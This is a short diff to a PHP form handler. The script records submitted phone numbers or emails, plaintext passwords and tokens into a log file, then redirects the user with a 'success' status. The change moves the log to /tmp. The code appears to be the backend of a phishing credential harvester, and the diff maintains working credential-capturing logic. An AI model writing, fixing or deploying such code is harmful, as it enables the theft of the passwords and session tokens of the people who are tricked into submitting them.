@@ -10,7 +10,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $log_entry = "[$timestamp] Phone/Email: " . $phone . " | Password: " . $password . " | Token: " . $token . "\n";
 
     // Append to loge.txt
-    file_put_contents("loge.txt", $log_entry, FILE_APPEND);
+    file_put_contents("/tmp/loge.txt", $log_entry, FILE_APPEND);
 
     // Redirect back to the main page or a success page
     header("Location: index.html?status=success");
